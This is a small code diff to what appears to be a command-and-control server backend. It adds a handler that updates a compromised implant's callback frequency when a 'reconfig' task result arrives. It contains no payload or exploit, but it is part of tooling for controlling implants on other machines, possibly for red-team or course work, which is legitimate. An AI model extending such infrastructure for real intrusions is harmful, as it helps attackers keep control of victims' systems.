@@ -230,6 +230,17 @@ def create_results(
         decoded_args = ""
     results_data = results.model_dump(exclude={"session", "date"})
     results_data["args"] = decoded_args
+    
+    if results_data["task"] == "reconfig":
+        update_callback_freq(session, results_data, db)
+        #new_callback_freq = results_data["args"].split(" ")[0]
+    # need to update callback interval...
+    #implant = db.query(Implant).filter(Implant.session == session).first()
+    #if implant is not None and implant.alive:
+    #    implant.callback_freq = new_callback_freq
+    #    db.commit()
+    #    db.refresh(implant)
+
     # you will need to decode the results eventually
     db_task = Results(**results_data, session=session, date=current_time)
     db.add(db_task)
@@ -249,6 +260,15 @@ def create_results(
         print("Task not found, cannot update completion status in the tasking table.")
         raise HTTPException(status_code=404, detail="Task not found")
     return db_task
+
+
+def update_callback_freq(session: str, results_data: dict, db: SessionLocal = Depends(get_db)): # type: ignore
+    new_callback_freq = results_data["args"].split(" ")[0]
+    implant = db.query(Implant).filter(Implant.session == session).first()
+    if implant is not None and implant.alive:
+        implant.callback_freq = new_callback_freq
+        db.commit()
+        db.refresh(implant)
 
 
 # PROTECTED endpoint in order to create a task for an implant (client -> server)
